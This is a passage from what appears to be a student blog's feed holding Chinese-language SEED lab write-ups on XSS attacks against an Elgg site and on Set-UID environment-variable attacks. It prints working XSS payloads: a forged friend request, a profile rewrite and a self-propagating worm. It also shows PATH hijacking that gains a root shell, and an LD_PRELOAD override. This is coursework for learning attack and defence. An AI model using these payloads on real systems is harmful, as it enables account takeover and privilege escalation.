src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105175816813.png" class=""></li></ol><h1>Task 4: Becoming the Victim’s Friend</h1><p>task4实现的是将攻击者作为好友自动添加到受害者的好友列表中，这主要是通过再受害者的浏览器中伪造HTTP请求来实现。</p><ol><li><p>找到接口。以samy的身份登录，添加alice为好友，查看get请求的信息。</p><img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105175858713.png" class=""><p>可以看到，添加好友时需要有url信息、friends号、__elgg_ts和__elgg_token参数。</p></li><li><p>查看members的ID，获取攻击者samy的id，从查看元素的结果可以看到，攻击者samy的id为59。</p><img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105175940229.png" class=""></li><li><p>在“about me”的HTML编辑模式中构造js代码，然后保存。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">Ajax</span>=<span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">var</span> ts=<span class="hljs-string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_ts</span>; <br>    <span class="hljs-keyword">var</span> token=<span class="hljs-string">&quot;&amp;__elgg_token=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_token</span>; <br><br>    <span class="hljs-keyword">var</span> sendurl=<span class="hljs-string">&quot;http://www.seed-server.com/action/friends/add?friend=59&quot;</span>+ts+token;<br><br>    <span class="hljs-title class_">Ajax</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>    <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;GET&quot;</span>, sendurl, <span class="hljs-literal">true</span>);<br>    <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">send</span>();<br>&#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105175955233.png" class=""></li><li><p>以受害者alice的身份登录，开始时未添加任何好友。但访问攻击者samy的主页，在未执行添加动作的情况下，返回alice的好友列表，发现samy已经成为其好友，说明恶意的js代码被成功执行。</p><p>初始情况：无好友</p><img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180026486.png" class=""><p>访问攻击者主页，未加好友：</p><img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180059859.png" class=""><p>攻击者被加入好友列表：</p><img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180115068.png" class=""></li><li><p>问题回答</p><p>Question 1: Explain the purpose of Lines ➀ and ➁, why are they are needed?</p><p>这两行代码实现的是认证功能，服务器需要对用户的请求进行认证，所以我们需要获取这两个字段的信息才能使js代码的功能实现，在找接口的那一步中也可以看到，发送GET请求时是需要这两个参数的。</p><p>Question 2: If the Elgg application only provide the Editor mode for the “About Me” field, i.e.,you cannot switch to the Text mode, can you still launch a successful attack?</p></li></ol><h1>Task 5: Modifying the Victim’s Profile</h1><p>task5实现的是：当受害者访问攻击者的主页时，攻击代码被执行，受害者的个人简介被修改为指定内容。</p><ol><li><p>找到接口。修改简介通过POST方式实现，查看POST携带的参数，我们需要提交的参数有修改的字段名和对应的访问权限，以及guid、name。另外，POST请求的url为“<a href="http://www.seed-server.com/action/profile/edit%E2%80%9D%E3%80%82">http://www.seed-server.com/action/profile/edit”。</a></p><img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180242361.png" class=""><img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180255917.png" class=""></li><li><p>在content中设置好对应的字段，拼接上希望修改的简介信息。”samyGuid”为攻击者的id，因为在保存js代码时会自动跳转到主页，因而执行js代码，在这种情况下，连攻击者的信息都会被修改。但是我们希望的是由受害者自己去触发js代码的执行，所以在后面有一个if的条件判断，当触发者非攻击者时，执行攻击行为。(回答Question 3)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script type=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;<br><span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <br>    <span class="hljs-comment">//JavaScript code to access user name, user guid, Time Stamp __elgg_ts</span><br>    <span class="hljs-comment">//and Security Token __elgg_token</span><br>    <span class="hljs-keyword">var</span> userName=<span class="hljs-string">&quot;&amp;name=&quot;</span>+elgg.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">name</span>;<br>    <span class="hljs-keyword">var</span> guid=<span class="hljs-string">&quot;&amp;guid=&quot;</span>+elgg.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">guid</span>;<br>    <span class="hljs-keyword">var</span> ts=<span class="hljs-string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_ts</span>;<br>    <span class="hljs-keyword">var</span> token=<span class="hljs-string">&quot;&amp;__elgg_token=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_token</span>;<br>    <br>    <span class="hljs-comment">//Construct the content of your url.</span><br>    <span class="hljs-keyword">var</span> content=token+ts+<span class="hljs-string">&quot;&amp;description=hello,alice!&quot;</span>+<span class="hljs-string">&quot;&amp;accesslevel[description]=2&quot;</span>+userName+guid; <span class="hljs-comment">//FILL IN</span><br>    <span class="hljs-keyword">var</span> samyGuid=<span class="hljs-number">59</span>; <span class="hljs-comment">//FILL IN</span><br>    <span class="hljs-keyword">var</span> sendurl=<span class="hljs-string">&quot;http://www.seed-server.com/action/profile/edit&quot;</span>; <span class="hljs-comment">//FILL IN</span><br>    <br>    <span class="hljs-keyword">if</span>(elgg.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">guid</span>!=samyGuid) <br>    &#123;<br>        <span class="hljs-comment">//Create and send Ajax request to modify profile</span><br>        <span class="hljs-keyword">var</span> <span class="hljs-title class_">Ajax</span>=<span class="hljs-literal">null</span>;<br>        <span class="hljs-title class_">Ajax</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>        <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;POST&quot;</span>, sendurl, <span class="hljs-literal">true</span>);<br>        <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>,<br>        <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);<br>        <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">send</span>(content);<br>    &#125;<br>&#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180314179.png" class=""></li><li><p>受害者alice登录时为编辑个人简介，访问攻击者samy的主页后，个人简介信息被编辑为指定内容。</p><p>受害者访问攻击者前：</p><img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180341035.png" class=""><p>受害者访问攻击者后：</p><img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180358820.png" class=""></li></ol><h1>Task 6: Writing a Self-Propagating XSS Worm</h1><p>task6实现的是js代码的自动传播，让受害者成为攻击者。</p><ol><li><p>根据示例代码修改js代码，在之前实验代码的基础上增加了实现自我复制的代码。攻击代码的标签为“worm”，通过“document.getElementById(“worm”).innerHTML;”把整段代码进行复制，使受害者的页面也嵌入了攻击代码。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script id=<span class="hljs-string">&quot;worm&quot;</span>&gt;<br>    <span class="hljs-keyword">var</span> headerTag = <span class="hljs-string">&quot;&lt;script id=\&quot;worm\&quot; type=\&quot;text/javascript\&quot;&gt;&quot;</span>;<br>    <span class="hljs-keyword">var</span> jsCode = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;worm&quot;</span>).<span class="hljs-property">innerHTML</span>;<br>    <span class="hljs-keyword">var</span> tailTag = <span class="hljs-string">&quot;&lt;/&quot;</span> + <span class="hljs-string">&quot;script&gt;&quot;</span>;<br>    <span class="hljs-keyword">var</span> wormCode = <span class="hljs-built_in">encodeURIComponent</span>(headerTag + jsCode + tailTag);<br>    <span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        <span class="hljs-keyword">var</span> userName=<span class="hljs-string">&quot;&amp;name=&quot;</span>+elgg.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">name</span>;<br>        <span class="hljs-keyword">var</span> guid=<span class="hljs-string">&quot;&amp;guid=&quot;</span>+elgg.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">guid</span>;<br>        <span class="hljs-keyword">var</span> ts=<span class="hljs-string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_ts</span>;<br>        <span class="hljs-keyword">var</span> token=<span class="hljs-string">&quot;&amp;__elgg_token=&quot;</span>+elgg.<span class="hljs-property">security</span>.<span class="hljs-property">token</span>.<span class="hljs-property">__elgg_token</span>;<br>        <br>        <span class="hljs-keyword">var</span> content=token + ts + userName +<span class="hljs-string">&quot;&amp;description=&quot;</span> + wormCode + <span class="hljs-string">&quot;&amp;accesslevel[description]=2&amp;briefdescription=has been modified by samy!&amp;accesslevel[briefdescription]=2&quot;</span> +guid;<br>        <span class="hljs-keyword">var</span> samyGuid=<span class="hljs-number">59</span>;<br>        <span class="hljs-keyword">var</span> sendurl=<span class="hljs-string">&quot;http://www.seed-server.com/action/profile/edit&quot;</span>;<br>        <br>        <span class="hljs-keyword">if</span>(elgg.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>.<span class="hljs-property">guid</span>!=samyGuid)<br>        &#123;<br>            <span class="hljs-keyword">var</span> <span class="hljs-title class_">Ajax</span>=<span class="hljs-literal">null</span>;<br>            <span class="hljs-title class_">Ajax</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();<br>            <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;POST&quot;</span>, sendurl, <span class="hljs-literal">true</span>);<br>            <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>,<br>                                  <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);<br>            <span class="hljs-title class_">Ajax</span>.<span class="hljs-title function_">send</span>(content);<br>        &#125;<br>    &#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180430923.png" class=""></li><li><p>受害者1alice访问攻击者的samy主页，简介信息被修改，接着受害者2boby访问alice的主页，简介信息也被修改了。</p><p>alice访问攻击者主页，信息被修改：</p><img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180448461.png" class=""><p>boby访问alice的主页：</p><img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180538695.png" class=""><p>boby的信息被修改：</p><img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180544078.png" class=""><p>boby的主页被嵌入xss攻击代码：</p><img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180549105.png" class=""></li></ol><h1>Task 7: Defeating XSS Attacks Using CSP</h1><ol><li><p>初始情况下分别访问三个网站，访问<a href="http://www.example32a.com">http://www.example32a.com</a>，点击按钮，出现弹窗；访问<a href="http://www.example32b.xn--comhttp-bs4l">http://www.example32b.com和http</a>://www.example32c.com时点击按钮，均无弹窗。</p><img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180617072.png" class=""><img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180646621.png" class=""><ol start="2"><li><p>修改apache_scp.conf文件，重新输入命令dcbuild、dcup，<a href="http://xn--www-l01ei38ip54bo5o.example32b.com">再次访问www.example32b.com</a>，区域5的也变为“OK”。</p><p>修改apache_scp.conf：</p><img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180708202.png" class=""><p><a href="http://xn--www-7n0jp43b.example32b.com">访问www.example32b.com</a>：</p><img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180735411.png" class=""></li></ol></li><li><p>修改phpindex.php文件，重新输入命令dcbuild、dcup，<a href="http://xn--www-l01ei38ip54bo5o.example32c.com">再次访问www.example32c.com</a>，所有的都变为“OK”，点击按钮，出现弹窗。</p><p>修改phpindex.php：</p><p><a href="http://xn--www-7n0jp43b.example32c.com">访问www.example32c.com</a>：</p><img src="/2024/02/20/Lab7_XSS%E6%94%BB%E5%87%BB/image-20230105180812402.png" class=""></li></ol>]]></content>
    
    
    <categories>
      
      <category>网络攻防课程实验</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Lab6-环境变量与set-uid</title>
    <link href="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/"/>
    <url>/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/</url>
    
    <content type="html"><![CDATA[<h1>Task 1: Manipulating Environment Variables</h1><h2 id="task1-1">task1.1</h2><p>Use <code>printenv</code> or <code>env</code> command to print out the environment variables. If you are interested in</p><p>some particular environment variables, such as <code>PWD</code>, you can use “<code>printenv PWD</code>” or &quot;<code>env |</code></p><p><code>grep PWD</code>&quot;.</p><ol><li>使用env命令查看命令查看环境变量</li></ol><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.1.jpg" class=""><ol start="2"><li><p>查看特定的环境变量</p><p>这里分别使用env和printenv命令查看“PWD”变量。</p></li></ol><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.1.2.jpg" class=""><h2 id="task1-2">task1.2</h2><ol><li>设置环境变量</li></ol><p>使用export命令新增一个环境变量“newenv”，接着分别使用echo和env命令查看结果，可以看到，新增环境变量的值被成功打印输出，说明成功新增环境变量。</p><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.1.3.jpg" class=""><ol start="2"><li>删除环境变量</li></ol><p>使用unset命令删除刚刚新增的环境变量，再次查看，结果表明该环境变量已被删除。</p><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.1.4.jpg" class=""><h1>Task 2: Passing Environment Variables from Parent Process to Child Process</h1><h2 id="task2-1">task2.1</h2><p>please see the manual of fork() by typing the following command: man fork.</p><p>输入命令man fork</p><p>该文档说明fork函数执行时会在内存的另一个地方创建一个状态相同的进程，称为子进程。子进程的ID，与父进程不相同。</p><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.2.1.jpg" class=""><h2 id="task2-2">task2.2</h2><ol><li><p>编译mypritenv.c，将编译结果写入文件file</p><p>该程序打印的是子进程的环境变量。</p></li></ol><ol start="2"><li>通过运行编译结果，可以看到子进程的所有环境变量。</li></ol><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.2.3.jpg" class=""><ol start="3"><li>修改代码，使程序输出的是父进程的环境变量。</li></ol><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.2.4.jpg" class=""><ol start="4"><li><p>重新编译，编译结果为b.out文件。</p><p>从比较结果来看，这两个文件仅在文件名上有所不同，其余的内容一样，说明子进程继承了父进程的环境变量，即子进程创建时的环境变量与父进程相同。</p></li></ol><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.2.2.jpg" class=""><h1>Task 3: Environment Variables and execve()</h1><ol><li>编译运行myenv.c，该程序通过命令execve执行&quot;/usr/bin/env&quot;命令。execve的三个参数分别代表的是执行命令所在文件的路径，第二个参数是需要执行的命令的集合，第三个参数是传递给文件的环境变量。由于传递的环境变量为NULL，所以运行程序时没有输出。</li></ol><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.3.1.jpg" class=""><ol start="2"><li>把第三个参数改为“environ”，即把当前的环境变量传递进去。</li></ol><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.3.2.jpg" class=""><ol start="3"><li>运行修改后的程序，可以看到，程序输出了环境变量。执行execve时不会像fork一样继承原来的环境变量，环境变量由传递进来的参数决定，原来的环境变量将被覆盖。</li></ol><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.3.3.jpg" class=""><h1>Task 4: Environment Variables and system()</h1><ol><li>task4.c调用system执行“/usr/bin/env”命令，运行编译后的程序，可以看到环境变量被打印出来。</li></ol><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.3.4.jpg" class=""><ol start="2"><li><p>使用man命令查看system的用法</p><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.4.1.jpg" class=""><p>可以看到，system使用fork产生一个新的进程，这意味着新进程将继承原有的环境变量。然后通过execl调用外部命令“/bin/sh -c command”来执行命令，所以使用system查看环境变量时，原有的环境变量将被输出。</p></li></ol><h1>Task 5: Environment Variable and Set-UID Programs</h1><ol><li>编写示例代码task5.c</li></ol><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.5.1.jpg" class=""><ol start="2"><li>编译运行示例代码，打印环境变量。</li></ol><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.5.2.jpg" class=""><ol start="3"><li>把task5.c的所有者改为root，并且使其称为set-uid程序。接着使用“ls -l”命令查看设置的结果，task5标红，说明它现在是一个特权程序。</li></ol><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.5.3.jpg" class=""><ol start="3"><li><p>设置PATH</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$PATH</span>:/usr/local/bin&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>设置LD_LIBRARY_PATH</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">LD_LIBRARY_PATH</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$LD_LIBRARY_PATH</span>:/usr/local/bin&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>设置新的环境变量</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">TASK</span>=task5<br></code></pre></td></tr></table></figure></li></ol><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.5.2-16674533606342.jpg" class=""><ol start="6"><li><p>运行特权程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./task5<br></code></pre></td></tr></table></figure><p>​从输出结果来看，所设置的TASK变量和PATH变量正常输出，但是没有输出变量LD_LIBRARY_PATH。因为当运行task5时，shell会启动一个新进程来运行，子进程会继承原来父进程的环境变量。但是由于我们把task5设置为特权进程，所有者为root，也就是说，此时的EUID和RUID不一样。在动态链接库的保护机制中，EUID和RUID不一致时，将会忽略LD_LIBRARY_PATH和LD_LIBRARY变量，所以在上面的实验中，LD_LIBRARY_PATH没有出现。</p><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.5.3-16674534746286.jpg" class=""><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.5.4.jpg" class=""></li></ol><h1>task6 <strong>The PATH Environment Variable and</strong> Set-UID Programs</h1><h2 id="6-1-使system执行的是恶意构造的“ls”">6.1 使system执行的是恶意构造的“ls”</h2><ol><li><p>因为Ubuntu 20.04具有相应的防御机制，所以首先进入到实验提供的shell/zsh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">rm</span> /bin/sh<br>sudo <span class="hljs-built_in">ln</span> -s /bin/zsh /bin/sh<br></code></pre></td></tr></table></figure></li></ol><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.6.1.jpg" class=""><ol start="2"><li><p>将实验提供的代码编译为task6，并且使其称为特权程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//task6</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    system(<span class="hljs-string">&quot;ls&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">chown</span> root task6<br>sudo <span class="hljs-built_in">chmod</span> 4755 task6<br><span class="hljs-built_in">ls</span> -l task6<br></code></pre></td></tr></table></figure></li></ol><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.6.2.jpg" class=""><ol start="3"><li>运行task6，将打印输出当前目录。</li></ol><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.6.3.jpg" class=""><ol start="4"><li><p>编写我们构造的恶意代码，编译后的名称为ls，这个程序将被用来取代系统原来的“ls”。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">gcc -o <span class="hljs-keyword">ls</span> bad_<span class="hljs-keyword">ls</span>.c<br></code></pre></td></tr></table></figure></li></ol><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.6.4.jpg" class=""><ol start="5"><li><p>将恶意“ls”所在文件夹的路径添加到PATH变量的开头</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">export PATH=<span class="hljs-regexp">/home/</span>seed<span class="hljs-regexp">/Desktop/</span>lab<span class="hljs-regexp">/lab6/</span>Labsetup:<span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure></li></ol><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.6.5.jpg" class=""><ol start="6"><li>运行特权程序task6，“ls”执行的是我们自己编写的ls，而不是系统原本的“ls”。</li></ol><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.6.7.jpg" class=""><p>​出现上面的结果是因为system函数执行命令时，传进去的参数未使用绝对路径，所以system函数首先会在PATH变量中找命令所在的文件路径，并且是顺序查找。利用export将恶意的“ls”所在路径添加到PATH环境变量开头时，恶意“ls”就会被首先检索到，隐藏task6中执行的是恶意构造的“ls”。</p><h2 id="6-2-获取一个有root权限的shell">6.2 获取一个有root权限的shell</h2><ol><li><p>将/bin/sh拷贝到当前目录下的ls文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> /bin/sh <span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure></li><li><p>将当前目录添加到环境变量PATH中</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">PATH</span>=/home/seed/Desktop/lab/lab6/Labsetup<br></code></pre></td></tr></table></figure></li><li><p>执行task6，获得了具有root权限的shell。因为ls文件里的内容为/bin/sh，并且task6已经被设置为Set-UID程序，也就是一个特权程序，所以最后能够得到具有root权限的shell。</p><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.6.8.jpg" class=""></li></ol><h1>Task 7 The LD_PRELOAD Environment Variable and Set-UID Programs</h1><h2 id="7-1-使用动态链接库">7.1 使用动态链接库</h2><ol><li><p>编写mylib.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">sleep</span> <span class="hljs-params">(<span class="hljs-type">int</span> s)</span><br>&#123;<br><span class="hljs-comment">/* If this is invoked by a privileged program,</span><br><span class="hljs-comment">you can do damages here! */</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;I am not sleeping!\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.7.1.jpg" class=""><ol start="2"><li>编译，创建一个共享库，并将共享库添加到LD_PRELOAD环境变量中。</li></ol><img src="/2024/02/20/Lab6_%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8Eset-uid/6.7.2.jpg" class=""><ol start="3"><li><p>编译myprog.c，并放在与libmylib.so.1.0.1相同目录下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td 